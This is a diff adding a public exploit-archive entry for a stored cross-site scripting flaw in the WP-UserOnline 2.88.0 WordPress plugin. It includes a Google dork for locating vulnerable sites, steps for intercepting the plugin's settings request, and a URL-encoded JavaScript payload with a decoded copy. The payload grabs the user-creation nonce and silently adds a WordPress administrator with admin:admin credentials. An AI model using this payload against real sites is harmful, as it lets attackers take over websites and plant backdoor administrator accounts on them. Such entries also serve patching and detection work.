@@ -1,0 +1,51 @@
+id: 39660
+date: 06/14/2024
+title: WP-UserOnline 2.88.0 - Stored Cross Site Scripting (Authenticated) Vulnerability
+author: Onur Göğebakan
+cves: 
+
+# Exploit Title: WP-UserOnline 2.88.0 - Stored Cross Site Scripting (XSS) (Authenticated)
+# Google Dork: inurl:/wp-content/plugins/wp-useronline/
+# Exploit Author: Onur Göğebakan
+# Vendor Homepage: https://github.com/lesterchan/wp-useronline
+# Software Link: https://downloads.wordpress.org/plugin/wp-useronline.2.88.0.zip
+# Category: Web Application
+# Version: 2.88.0
+# Tested on: WordPress 6.5.4 - Windows 10
+# CVE : CVE-2022-2941
+
+# Explanation:
+A new administrator user can be added to WordPress using a stored XSS vulnerability.
+
+
+# Exploit:
+  1. Visit http://poc.test/wp-admin/options-general.php?page=useronline-settings
+  2. Click Save and intercept the request.
+  3. Change `naming%5Bbots%5D` parameter value with belowed payload
+  ```
+    %3Cscript%3E+function+handleResponse%28%29+%7B+var+nonce+%3D+this.responseText.match%28%2Fname%3D%22_wpnonce_create-user%22+value%3D%22%28%5Cw%2B%29%22%2F%29%5B1%5D%3B+var+changeReq+%3D+new+XMLHttpRequest%28%29%3B+changeReq.open%28%27POST%27%2C%27%2Fwp-admin%2Fuser-new.php%27%2Ctrue%29%3B+changeReq.setRequestHeader%28%27Content-Type%27%2C%27application%2Fx-www-form-urlencoded%27%29%3B+var+params+%3D+%27action%3Dcreateuser%26_wpnonce_create-user%3D%27%2Bnonce%2B%27%26_wp_http_referer%3D%252Fwp-admin%252Fuser-new.php%27%2B%27%26user_login%3Dadmin%26email%3Dadmin%2540mail.com%26first_name%3D%26last_name%3D%26url%3D%26pass1%3Dadmin%26pass2%3Dadmin%26pw_weak%3Don%26role%3Dadministrator%26createuser%3DAdd%2BNew%2BUser%27%3B+changeReq.send%28params%29%3B+%7D+var+req+%3D+new+XMLHttpRequest%28%29%3B+req.onload+%3D+handleResponse%3B+req.open%28%27GET%27%2C+%27%2Fwp-admin%2Fuser-new.php%27%2C+true%29%3B+req.send%28%29%3B+%3C%2Fscript%3E
+  ```
+  4. Payload executed when user visited http://poc.test/wp-admin/index.php?page=useronline
+  5. Administrator user added with admin:admin credentials.
+
+
+# Decoded payload
+```
+function handleResponse() {
+    var nonce = this.responseText.match(/name="_wpnonce_create-user" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('POST', '/wp-admin/user-new.php', true);
+    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    var params = 'action=createuser&_wpnonce_create-user=' + nonce +
+        '&_wp_http_referer=%2Fwp-admin%2Fuser-new.php' +
+        '&user_login=admin&email=admin%40mail.com&first_name=&last_name=&url=&pass1=admin&pass2=admin&pw_weak=on&role=administrator&createuser=Add+New+User';
+    changeReq.send(params);
+}
+
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('GET', '/wp-admin/user-new.php', true);
+req.send();
+```
+
+#  0day.today [2024-06-19]  #
